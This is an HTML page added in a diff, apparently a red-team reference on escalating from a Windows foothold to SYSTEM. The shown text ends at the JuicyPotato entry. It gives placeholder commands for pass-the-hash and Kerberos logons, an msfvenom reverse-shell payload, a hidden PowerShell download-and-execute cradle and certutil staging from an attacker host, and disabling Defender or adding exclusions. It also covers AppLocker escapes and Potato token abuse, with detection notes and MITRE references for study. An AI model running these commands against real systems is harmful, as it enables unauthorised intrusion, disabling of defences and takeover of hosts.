@@ -1,0 +1,1285 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>Windows Privilege Escalation | HackGraph Reference</title>
+<meta name="description" content="Windows Privilege Escalation: From a foothold to NT AUTHORITY\SYSTEM: token privileges (SeImpersonate, Potato), UAC bypass, service and DLL misconfigurations, unquoted paths, stored credentials, privileged groups, and defense evasion (AMSI, EDR, AppLocker)."/>
+<meta name="keywords" content="cybersecurity, offensive security, penetration testing, red team, OSCP notes, OSEP, CRTP, PNPT, CTF, privilege escalation, Active Directory, Windows privilege escalation, Linux privilege escalation, Kerberoasting, NTLM relay, AD CS ESC1, pass-the-hash, DCSync, ethical hacking, attack path, pentest cheat sheet"/>
+<link rel="canonical" href="https://hackgraph.github.io/reference/windows-privilege-escalation.html"/>
+<meta name="robots" content="index, follow, max-image-preview:large"/>
+<link rel="icon" type="image/svg+xml" href="/favicon.svg"/>
+<meta name="theme-color" content="#0c0a0b"/>
+<meta property="og:type" content="article"/>
+<meta property="og:site_name" content="HackGraph"/>
+<meta property="og:title" content="Windows Privilege Escalation | HackGraph Reference"/>
+<meta property="og:description" content="Windows Privilege Escalation: From a foothold to NT AUTHORITY\SYSTEM: token privileges (SeImpersonate, Potato), UAC bypass, service and DLL misconfigurations, unquoted paths, stored credentials, privileged groups, and defense evasion (AMSI, EDR, AppLocker)."/>
+<meta property="og:url" content="https://hackgraph.github.io/reference/windows-privilege-escalation.html"/>
+<meta property="og:image" content="https://hackgraph.github.io/og-image.png"/>
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hackgraph.github.io/og-image.png"/>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Windows Privilege Escalation","name":"Windows Privilege Escalation | HackGraph Reference","url":"https://hackgraph.github.io/reference/windows-privilege-escalation.html","description":"Windows Privilege Escalation: From a foothold to NT AUTHORITY\\SYSTEM: token privileges (SeImpersonate, Potato), UAC bypass, service and DLL misconfigurations, unquoted paths, stored credentials, privileged groups, and defense evasion (AMSI, EDR, AppLocker).","inLanguage":"en","author":{"@type":"Organization","name":"HackGraph"},"publisher":{"@type":"Organization","name":"HackGraph"},"isPartOf":{"@type":"WebSite","name":"HackGraph","url":"https://hackgraph.github.io/"}}</script>
+<style>
+:root{--bg:#0c0a0b;--panel:#160f11;--ink:#f0eaec;--dim:#a59699;--faint:#8a7d80;--accent:#f04450;--border:rgba(214,168,172,.13)}
+@font-face{font-family:'Geist';font-weight:400;font-display:swap;src:url('/fonts/geist-sans-latin-400-normal.woff2') format('woff2')}
+@font-face{font-family:'Geist';font-weight:600;font-display:swap;src:url('/fonts/geist-sans-latin-600-normal.woff2') format('woff2')}
+@font-face{font-family:'Geist Mono';font-weight:400;font-display:swap;src:url('/fonts/geist-mono-latin-400-normal.woff2') format('woff2')}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:'Geist',system-ui,-apple-system,sans-serif;line-height:1.6;letter-spacing:-.01em;-webkit-font-smoothing:antialiased}
+a{color:var(--accent);text-decoration:none}a:hover{text-decoration:underline}
+header.top{border-bottom:1px solid var(--border);padding:14px 24px;display:flex;align-items:center;gap:12px;position:sticky;top:0;background:rgba(12,10,11,.85);backdrop-filter:blur(10px)}
+header.top .name{font-weight:600;font-size:17px}
+header.top .cta{margin-left:auto;font-size:14px;color:var(--dim)}
+main{max-width:860px;margin:0 auto;padding:40px 24px 96px}
+h1{font-size:30px;font-weight:600;line-height:1.2;margin:0 0 14px}
+.lead{color:var(--dim);font-size:17px;margin:0 0 10px}
+.toc{margin:20px 0 8px;padding:0;list-style:none;display:flex;flex-wrap:wrap;gap:10px}
+.toc a{border:1px solid var(--border);border-radius:999px;padding:5px 12px;font-size:13px;color:var(--ink)}
+section.phase{margin-top:44px}
+h2.phase-h{font-size:13px;font-weight:600;text-transform:uppercase;letter-spacing:.09em;padding-bottom:6px;border-bottom:1px solid var(--border)}
+article{padding:18px 0;border-bottom:1px solid var(--border)}
+article h3{font-size:19px;font-weight:600;margin:0 0 4px;scroll-margin-top:70px}
+.kind{font-size:11px;text-transform:uppercase;letter-spacing:.08em;color:var(--faint);font-weight:600}
+.summary{color:var(--ink);margin:6px 0}
+.desc{color:var(--dim);margin:8px 0}
+.meta{color:var(--faint);font-size:13px}
+h4{font-size:11px;text-transform:uppercase;letter-spacing:.08em;color:var(--faint);margin:16px 0 6px}
+ul.req{margin:4px 0;padding-left:18px;color:var(--dim);font-size:14px}
+pre{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:12px 14px;overflow:auto;margin:6px 0}
+code{font-family:'Geist Mono',ui-monospace,Menlo,monospace;font-size:13px;color:#e7dfe1}
+pre .cmt{color:var(--faint)}
+ul.links{margin:4px 0;padding-left:18px;font-size:14px}
+.opsec{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:10px 14px;margin:12px 0;color:var(--dim);font-size:14px}
+.opsec b{color:var(--ink)}
+footer{max-width:860px;margin:0 auto;padding:32px 24px 64px;color:var(--faint);font-size:14px;border-top:1px solid var(--border)}
+</style>
+</head>
+<body>
+<header class="top"><a href="/" style="display:flex;align-items:center;gap:10px;color:var(--ink)"><svg viewBox="0 0 24 24" width="26" height="26" fill="none" aria-hidden="true"><path d="M9.5 12 H11.5 V5.5 H13.5 M11.5 12 V18.5 H13.5" stroke="#a59699" stroke-width="1.8" stroke-linejoin="round"/><rect x="1" y="8.5" width="8.5" height="7" rx="2.2" fill="#f0eaec"/><rect x="13.5" y="2" width="8.5" height="7" rx="2.2" fill="#a59699"/><rect x="13.5" y="15" width="8.5" height="7" rx="2.2" fill="#f04450"/></svg><span class="name">HackGraph</span></a><a class="cta" href="/">Open the interactive graph &rarr;</a></header>
+<main>
+<h1>Windows Privilege Escalation</h1>
+<p class="lead">From a foothold to NT AUTHORITY\SYSTEM: token privileges (SeImpersonate, Potato), UAC bypass, service and DLL misconfigurations, unquoted paths, stored credentials, privileged groups, and defense evasion (AMSI, EDR, AppLocker).</p>
+<p class="meta">93 techniques and steps. <a href="/">Explore this map interactively &rarr;</a></p>
+<ul class="toc"><li><a href="#ph-access">Initial Access</a></li><li><a href="#ph-execution">Execution &amp; Evasion</a></li><li><a href="#ph-triage">Triage</a></li><li><a href="#ph-hold">Privileged Users</a></li><li><a href="#ph-admin">Admin Users</a></li><li><a href="#ph-finding">Unprivileged Users</a></li><li><a href="#ph-svcacct">Service Account</a></li><li><a href="#ph-system">SYSTEM</a></li></ul>
+<section class="phase" id="ph-access"><h2 class="phase-h" style="color:oklch(0.70 0.13 300)">Initial Access</h2><article id="win-foothold-start">
+<h3><span class="kind">start</span> Get a Foothold</h3>
+<p class="summary">Land a session on a Windows host you can reach.</p>
+<p class="desc">You can reach a Windows host and hold (or can obtain) a credential or a code-execution primitive, but no shell yet. Turn that into an interactive or command session: log on with the credential material you hold, or stabilise a code-execution primitive into a usable shell. Either route yields a Local Foothold, and the privilege-escalation triage begins.</p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Windows Local Privilege Escalation</a></li></ul>
+</article>
+<article id="win-cat-logon">
+<h3><span class="kind">category</span> Credentialed Logon</h3>
+<p class="summary">Use a credential to open a session on the host.</p>
+<p class="desc">You hold credential material for an account with remote-access rights. How you authenticate depends on what you hold: a cleartext password or key, an NT hash, or a Kerberos ticket. The Active Directory map carries the full lateral-movement detail; here it is the entry to a local foothold.</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1021/" rel="noopener nofollow">T1021</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/index.html" rel="noopener nofollow">HackTricks, Lateral Movement</a></li></ul>
+</article>
+<article id="win-logon-password">
+<h3>Password / Key Logon</h3>
+<p class="summary">Cleartext password or key into a WinRM, RDP, SMB, or SSH session.</p>
+<p class="desc">With a valid account password (or an SSH private key), open a session over whichever remote service the account may use: WinRM for a PowerShell shell, RDP for an interactive desktop, SMB command execution in the admin user's context (SYSTEM only if the smbexec/service method is used), or SSH on OpenSSH hosts. Membership in Remote Management Users, Remote Desktop Users, or local Administrators decides which services accept the logon.</p>
+<h4>Requires</h4><ul class="req"><li>A valid account password or key</li><li>A remote-access service the account may use (WinRM/RDP/SMB/SSH)</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># WinRM PowerShell shell</span>
+evil-winrm -i &lt;host&gt; -u &lt;user&gt; -p '&lt;pass&gt;'</code></pre>
+<pre><code><span class="cmt"># SMB service exec (nxc)</span>
+nxc smb &lt;host&gt; -u &lt;user&gt; -p '&lt;pass&gt;' -x 'whoami'</code></pre>
+<pre><code><span class="cmt"># RDP session</span>
+xfreerdp /u:&lt;user&gt; /p:'&lt;pass&gt;' /v:&lt;host&gt; /cert:ignore</code></pre>
+<pre><code><span class="cmt"># SSH (OpenSSH on Windows)</span>
+ssh &lt;user&gt;@&lt;host&gt;</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/Hackplayers/evil-winrm" rel="noopener nofollow">evil-winrm</a></li><li><a href="https://github.com/Pennyw0rth/NetExec" rel="noopener nofollow">NetExec</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1021/" rel="noopener nofollow">T1021</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1021/" rel="noopener nofollow">MITRE ATT&amp;CK, Remote Services (T1021)</a></li><li><a href="https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/index.html" rel="noopener nofollow">HackTricks, Lateral Movement</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Each logon writes a 4624 event (logon type 3 for SMB/WinRM, 10 for RDP); evil-winrm and service execution are signatured. Prefer the protocol the account already uses.</p>
+</article>
+<article id="win-logon-pth">
+<h3>Pass-the-Hash (NTLM)</h3>
+<p class="summary">NT hash into NTLM auth over SMB/PsExec or WinRM.</p>
+<p class="desc">When you hold an account's NT hash but not its cleartext, authenticate with the hash directly over NTLM rather than cracking it. SMB service execution (psexec/smbexec) needs local admin on the target; WinRM needs Remote Management Users. NTLM must be permitted (no Kerberos-only or Protected Users enforcement on the account).</p>
+<h4>Requires</h4><ul class="req"><li>An account NT hash</li><li>NTLM permitted, and local admin (SMB) or Remote Management Users (WinRM) on the target</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># SMB exec with the hash</span>
+nxc smb &lt;host&gt; -u &lt;user&gt; -H &lt;NThash&gt; -x 'whoami'</code></pre>
+<pre><code><span class="cmt"># PsExec SYSTEM shell</span>
+impacket-psexec -hashes :&lt;NThash&gt; &lt;user&gt;@&lt;host&gt;</code></pre>
+<pre><code><span class="cmt"># WinRM with the hash</span>
+evil-winrm -i &lt;host&gt; -u &lt;user&gt; -H &lt;NThash&gt;</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/fortra/impacket" rel="noopener nofollow">Impacket</a></li><li><a href="https://github.com/Pennyw0rth/NetExec" rel="noopener nofollow">NetExec</a></li><li><a href="https://github.com/Hackplayers/evil-winrm" rel="noopener nofollow">evil-winrm</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1550/002/" rel="noopener nofollow">T1550.002</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1550/002/" rel="noopener nofollow">MITRE ATT&amp;CK, Pass the Hash (T1550.002)</a></li><li><a href="https://www.thehacker.recipes/ad/movement/ntlm/pth" rel="noopener nofollow">The Hacker Recipes, Pass the Hash</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> PtH triggers NTLM logons (4624 type 3) with the machine reporting NTLM where Kerberos is expected. Modern EDR flags psexec service creation (7045).</p>
+</article>
+<article id="win-logon-kerberos">
+<h3>Kerberos Logon</h3>
+<p class="summary">A TGT/ccache or key into a Kerberos-authenticated WinRM/SMB session.</p>
+<p class="desc">With a Kerberos TGT (ccache) or an account's AES/NT key, authenticate over Kerberos instead of NTLM: overpass-the-hash mints a TGT from a key, pass-the-ticket reuses a stolen one. Open WinRM or SMB by the host's SPN/FQDN. The path of choice where NTLM is disabled.</p>
+<h4>Requires</h4><ul class="req"><li>A Kerberos TGT (ccache) or an AES/NT key</li><li>Target reachable by its Kerberos FQDN/SPN; clock within 5 minutes of the KDC</li><li>/etc/krb5.conf defining the realm (UPPERCASE) and its KDC, with KRB5CCNAME pointing at the ccache from the prior step; a missing or wrong krb5.conf is the most common silent failure</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Request a TGT, then use it</span>
+getTGT.py &lt;domain&gt;/&lt;user&gt; -hashes :&lt;NThash&gt;
+export KRB5CCNAME=&lt;user&gt;.ccache</code></pre>
+<pre><code><span class="cmt"># WinRM over Kerberos</span>
+evil-winrm -i &lt;host.fqdn&gt; -r &lt;REALM&gt;</code></pre>
+<pre><code><span class="cmt"># SMB with the ticket cache</span>
+nxc smb &lt;host.fqdn&gt; --use-kcache -x 'whoami'</code></pre>
+<pre><code><span class="cmt"># Fix clock skew (KRB_AP_ERR_SKEW)</span>
+sudo ntpdate -u &lt;dc&gt;   # or wrap the tool in faketime to avoid changing system time</code></pre>
+<pre><code><span class="cmt"># On-host TGT and inject (Rubeus)</span>
+Rubeus.exe asktgt /user:&lt;user&gt; /rc4:&lt;NThash&gt; /ptt</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/fortra/impacket" rel="noopener nofollow">Impacket</a></li><li><a href="https://github.com/GhostPack/Rubeus" rel="noopener nofollow">Rubeus</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1550/003/" rel="noopener nofollow">T1550.003</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1550/003/" rel="noopener nofollow">MITRE ATT&amp;CK, Pass the Ticket (T1550.003)</a></li><li><a href="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/pass-the-ticket.html" rel="noopener nofollow">HackTricks, Pass the Ticket</a></li><li><a href="https://blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It-wp.pdf" rel="noopener nofollow">Duckwall &amp; Delpy, Abusing Microsoft Kerberos (Black Hat USA 2014)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Kerberos logons blend in better than NTLM, but ticket requests for an unusual host/SPN and clock-skew errors are visible to the KDC.</p>
+</article></section>
+<section class="phase" id="ph-execution"><h2 class="phase-h" style="color:oklch(0.70 0.13 139)">Execution &amp; Evasion</h2><article id="win-exec-foothold">
+<h3>Code Execution</h3>
+<p class="summary">Turn a one-shot code-exec primitive into a stable interactive session.</p>
+<p class="desc">From a fragile or one-shot primitive (web RCE, command injection, a delivered payload), get a reliable shell: generate a payload, stage it onto the host, trigger a callback to your listener, then stabilise the session. The AD map covers reusing the resulting access to move on.</p>
+<h4>Requires</h4><ul class="req"><li>A code-execution primitive on the target</li><li>An outbound path to your listener (or an inbound port you can reach)</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Generate a payload</span>
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;you&gt; LPORT=443 -f exe -o s.exe</code></pre>
+<pre><code><span class="cmt"># Catch the shell</span>
+ncat -lvnp 443     # or OpenBSD nc -lvn 443 (port positional); or msfconsole: use exploit/multi/handler</code></pre>
+<pre><code><span class="cmt"># PowerShell download cradle</span>
+powershell -nop -w hidden -c &quot;IEX(New-Object Net.WebClient).DownloadString('http://&lt;you&gt;/a.ps1')&quot;</code></pre>
+<pre><code><span class="cmt"># Stage tooling onto the host</span>
+certutil -urlcache -split -f http://&lt;you&gt;/t.exe %TEMP%\t.exe</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/rapid7/metasploit-framework" rel="noopener nofollow">Metasploit (msfvenom)</a></li><li><a href="https://nmap.org/ncat/" rel="noopener nofollow">Ncat (Nmap)</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1059/" rel="noopener nofollow">T1059</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1059/" rel="noopener nofollow">MITRE ATT&amp;CK, Command and Scripting Interpreter (T1059)</a></li><li><a href="https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/windows.html" rel="noopener nofollow">HackTricks, Reverse Shells (Windows)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> msfvenom stock payloads and certutil downloads are heavily signatured. Match the payload arch to the target and prefer a LOLBin or in-memory cradle over dropping an EXE on monitored hosts.</p>
+</article>
+<article id="win-cat-evasion">
+<h3><span class="kind">category</span> Defense Evasion</h3>
+<p class="summary">Clear host controls before running loud tooling; applies however you got in.</p>
+<p class="desc">Defense evasion is an execution constraint on everything you run after the foothold, whether you arrived by a credentialed logon or a code-execution shell, not an escalation step. winPEAS, Potato tooling, driver loads, and LSASS access all trip AMSI, Defender / EDR + Tamper Protection, or AppLocker / WDAC / CLM. On a managed host, clear the relevant control (or pick native / LOLBIN / in-memory tradecraft) before working the escalation lanes; on an unmanaged host none of these controls apply.</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1562/001/" rel="noopener nofollow">T1562.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/av-bypass.html" rel="noopener nofollow">HackTricks, Antivirus (AV) Bypass</a></li></ul>
+</article>
+<article id="win-evade-amsi-av">
+<h3>AMSI / Defender Evasion</h3>
+<p class="summary">Run flagged tooling past AMSI and Defender.</p>
+<p class="desc">Your script or payload is caught by AMSI (in-memory script scanning) or Defender (on-disk and behavioural). Running fileless only reduces on-disk artifact exposure; PowerShell/script and some dynamic content can still hit AMSI and Defender behavioural/cloud detections, so use AMSI-aware obfuscation or a same-process AMSI bypass where that is the actual blocker. Where you hold admin, add an exclusion or disable real-time protection. An AMSI patch is per-process, so it must run in the same process that executes the payload.</p>
+<h4>Requires</h4><ul class="req"><li>Code execution in an AMSI-instrumented host (PowerShell/.NET), or write/exec where AV blocks the artifact</li><li>For disabling protection or adding exclusions: local admin / SYSTEM</li><li>Tamper Protection OFF: on modern default Windows (10/11 + Server) TP is on by default and SILENTLY blocks Set-MpPreference -DisableRealtimeMonitoring even for SYSTEM; the cmdlets return no error but no effect. Exclusion writes are blocked only where Defender exclusion tamper protection is actually enabled (typically Intune-only or ConfigMgr-only with the documented platform/settings requirements), so do not assume every managed host blocks local exclusions</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Confirm AMSI is the blocker</span>
+'AmsiScanBuffer' ; 'Invoke-Mimikatz'   # a known-bad string trips AMSI if it is on</code></pre>
+<pre><code><span class="cmt"># Check Tamper Protection before relying on Set-MpPreference</span>
+(Get-MpComputerStatus).IsTamperProtected</code></pre>
+<pre><code><span class="cmt"># Add a Defender exclusion (admin; blocked by TP on managed hosts)</span>
+Add-MpPreference -ExclusionPath C:\Windows\Temp   # Add- appends; Set-MpPreference -ExclusionPath REPLACES the whole list</code></pre>
+<pre><code><span class="cmt"># Disable real-time protection (admin/SYSTEM; blocked by TP on default hosts)</span>
+Set-MpPreference -DisableRealtimeMonitoring $true</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://amsi.fail/" rel="noopener nofollow">amsi.fail</a></li><li><a href="https://github.com/danielbohannon/Invoke-Obfuscation" rel="noopener nofollow">Invoke-Obfuscation</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1562/001/" rel="noopener nofollow">T1562.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1562/001/" rel="noopener nofollow">MITRE ATT&amp;CK, Impair Defenses: Disable or Modify Tools (T1562.001)</a></li><li><a href="https://book.hacktricks.wiki/en/windows-hardening/av-bypass.html" rel="noopener nofollow">HackTricks, Antivirus (AV) Bypass</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Successful RTP disablement/config changes commonly emit 5001/5007 (and related 5004/5010/5012 depending on what changed); Tamper Protection-blocked attempts emit 5013, and exclusion changes usually show as 5007 when they actually apply. Defender tampering is a high-signal detection. AMSI patches are loud if the patch string itself is signatured; vary it.</p>
+</article>
+<article id="win-evade-appcontrol">
+<h3>AppLocker / CLM / WDAC Escape</h3>
+<p class="summary">Escape a locked-down shell or application-control policy to run code.</p>
+<p class="desc">Execution is constrained by policy: PowerShell Constrained Language Mode (often a JEA endpoint), AppLocker, or WDAC. Run through an allowed LOLBIN (living-off-the-land binary: a trusted, signed Windows tool like MSBuild or InstallUtil, abused to run your code), fall back to the PowerShell v2 engine where it survives, or sign your payload with a recovered or forged code-signing certificate that a publisher allow-rule trusts. MSBuild and InstallUtil defeat default AppLocker and CLM but are neutered by a WDAC policy that carries the Microsoft recommended block rules; a WDAC escape generally needs a different vector (a signer/hash allow-list gap or a LOLBIN not yet on the block list).</p>
+<h4>Requires</h4><ul class="req"><li>Execution inside a ConstrainedLanguage / AppLocker / WDAC context</li><li>An allowed LOLBIN, the PSv2 engine, or a trusted code-signing certificate</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Check the language mode</span>
+$ExecutionContext.SessionState.LanguageMode</code></pre>
+<pre><code><span class="cmt"># Drop to PowerShell v2 IF .NET 3.5/2.0 is present (legacy hosts / Server 2012 R2)</span>
+powershell -version 2 -ep bypass   # fails silently on default Win10/11 + Server 2016+: .NET 3.5 not installed</code></pre>
+<pre><code><span class="cmt"># Run code via the MSBuild LOLBIN</span>
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://lolbas-project.github.io/" rel="noopener nofollow">LOLBAS</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1127/001/" rel="noopener nofollow">T1127.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1127/001/" rel="noopener nofollow">MITRE ATT&amp;CK, Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)</a></li><li><a href="https://lolbas-project.github.io/" rel="noopener nofollow">LOLBAS Project</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Script-block logging still records what you run even in Constrained Language Mode, and signed-binary proxy execution (MSBuild/InstallUtil) is a known EDR pattern. Code-signing abuse needs a cert the target already trusts.</p>
+</article></section>
+<section class="phase" id="ph-triage"><h2 class="phase-h" style="color:oklch(0.70 0.13 248)">Triage</h2><article id="pe-start">
+<h3><span class="kind">start</span> Local Foothold</h3>
+<p class="summary">A low-privilege shell. Triage the account first.</p>
+<p class="desc">You have command execution as a low-privilege (or service) account on a domain-joined or standalone Windows machine; the goal is NT AUTHORITY\SYSTEM (or local admin). Before any tooling, establish the security context. whoami names the account, so a service identity (LOCAL/NETWORK SERVICE, an application pool, MSSQL) is its own path; whoami /priv and whoami /groups decide the rest: a privileged token or group, an administrator restricted by UAC, or an unprivileged user who must enumerate the host for a misconfiguration.</p>
+<h4>Requires</h4><ul class="req"><li>A low-privilege shell on the host</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Check your own privileges/groups</span>
+whoami /priv &amp; whoami /groups</code></pre>
+<pre><code><span class="cmt"># winPEAS (fast checks)</span>
+winpeasany.exe quiet fast</code></pre>
+<pre><code><span class="cmt"># PrivescCheck (PowerShell)</span>
+powershell -ep bypass -c &quot;. .\PrivescCheck.ps1; Invoke-PrivescCheck&quot;</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/peass-ng/PEASS-ng" rel="noopener nofollow">winPEAS</a></li><li><a href="https://github.com/GhostPack/Seatbelt" rel="noopener nofollow">Seatbelt</a></li><li><a href="https://github.com/itm4n/PrivescCheck" rel="noopener nofollow">PrivescCheck</a></li></ul>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Windows Local Privilege Escalation</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> winPEAS/Seatbelt are noisy on disk and signatured by EDR. Consider running in-memory or using the built-in whoami/accesschk checks on monitored hosts.</p>
+</article></section>
+<section class="phase" id="ph-hold"><h2 class="phase-h" style="color:oklch(0.70 0.13 55)">Privileged Users</h2><article id="pe-cat-priv">
+<h3>Privileged Users</h3>
+<p class="summary">A privileged token or group you already hold.</p>
+<p class="desc">The account already holds something dangerous: an abusable token privilege or membership in a powerful local group. No hunting required: abuse the right you have.</p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Windows Local Privilege Escalation</a></li><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html" rel="noopener nofollow">HackTricks, Abusing Tokens</a></li></ul>
+</article>
+<article id="pe-cat-tokens">
+<h3><span class="kind">category</span> Token Privileges</h3>
+<p class="summary">whoami /priv, abusable token privileges.</p>
+<p class="desc">Dangerous privileges surfaced by whoami /priv: SeImpersonate / SeAssignPrimaryToken, SeBackup / SeRestore, SeDebug, SeTakeOwnership, SeLoadDriver, SeManageVolume, SeTrustedCredManAccess, SeCreateToken, SeTcb, and SeRelabel.</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1134/" rel="noopener nofollow">T1134</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html" rel="noopener nofollow">HackTricks, Abusing Tokens</a></li></ul>
+</article>
+<article id="pe-cat-groups">
+<h3><span class="kind">category</span> Local Group Membership</h3>
+<p class="summary">whoami /groups, privileged group membership.</p>
+<p class="desc">Membership in a local or built-in group whose rights convert to SYSTEM or credential theft: Backup / Server / Print Operators, DnsAdmins, Hyper-V Administrators, Event Log Readers, Account Operators, or a UAC-filtered Administrators token.</p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html" rel="noopener nofollow">HackTricks, Privileged Groups &amp; Token Privileges</a></li></ul>
+</article>
+<article id="pe-seimpersonate-potato">
+<h3>SeImpersonate / SeAssignPrimaryToken</h3>
+<p class="summary">Hold an impersonation privilege, then pick a Potato variant by Windows build.</p>
+<p class="desc">Service accounts (IIS, MSSQL, a relayed login) and many others hold SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege. The &quot;Potato&quot; family coerces a SYSTEM-level authentication or RPC call and impersonates the returned token to run code as NT AUTHORITY\SYSTEM. Every variant needs the same privilege; what changes is the coercion trick, which Microsoft has patched piecemeal. Confirm the privilege, then choose the variant that fits the target build and the services it is running.</p>
+<p class="meta"><b>Affects:</b> The privilege exists on every version; the working tool is build-specific. JuicyPotato up to Win10 1803 / Server 2016, RoguePotato for 1809 / Server 2019 and later, PrintSpoofer for 1809 / Server 2019 and later where the Print Spooler service is running (often disabled post-PrintNightmare, so lean on RoguePotato/GodPotato for Server 2022+), GodPotato across Windows 8 to 11 and Server 2012 to 2022.</p>
+<h4>Requires</h4><ul class="req"><li>SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Confirm the privilege</span>
+whoami /priv</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1134/001/" rel="noopener nofollow">T1134.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/" rel="noopener nofollow">itm4n, abusing impersonation privileges</a></li><li><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc" rel="noopener nofollow">jlajara, Potatoes (Windows privesc)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Potato binaries are heavily signatured by EDR/AV, and each variant has its own tell: RoguePotato produces outbound TCP/135 to a redirector; PrintSpoofer opens the local \pipe\spoolss named pipe (no 135 traffic); JuicyPotato/GodPotato do local DCOM activation.</p>
+</article>
+<article id="pe-pot-juicypotato">
+<h3>JuicyPotato</h3>
+<p class="summary">Abuse a SYSTEM DCOM/BITS CLSID for a SYSTEM token (legacy, pre-1809).</p>
+<p class="desc">The classic local-only Potato, a more flexible RottenPotatoNG that lets you pick any SYSTEM DCOM CLSID. Abuse a SYSTEM-owned DCOM server (BITS and others) by pointing its OXID resolution at a local listener, capture the SYSTEM NTLM authentication, and impersonate it. Needs a CLSID that runs as SYSTEM on the target build; the project ships a per-OS CLSID list. No network egress, so it is still the first pick on older hosts.</p>
+<p class="meta"><b>Affects:</b> Windows 7 through 10 1803 and Server 2008 through 2016. Broke on Windows 10 1809 / Server 2019, where the DCOM OXID resolver change removed the local trick.</p>
+<h4>Requires</h4><ul class="req"><li>SeImpersonate or SeAssignPrimaryToken</li><li>A DCOM CLSID that runs as SYSTEM on the target build</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Run with a SYSTEM CLSID for the OS</span>
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c whoami&quot; -t * -c {CLSID}</code></pre>
